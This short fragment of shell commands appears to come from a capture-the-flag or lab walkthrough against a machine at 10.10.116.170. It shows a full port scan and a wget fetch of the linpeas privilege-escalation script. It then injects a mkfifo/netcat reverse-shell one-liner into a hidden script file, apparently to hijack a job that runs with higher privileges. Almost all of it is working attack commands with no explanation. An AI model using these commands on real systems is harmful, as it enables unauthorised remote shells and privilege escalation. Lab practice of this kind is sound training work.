...
```shell
rustscan -a 10.10.116.170 --range 0-65535 --ulimit 5000 -- -sV
...
wget http://10.10.116.170:8000/linpeas.sh
...
#edit .quotes file
echo "shell; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.116.170 5555 >/tmp/f" > /opt/.dads_scripts/.files/.quotes
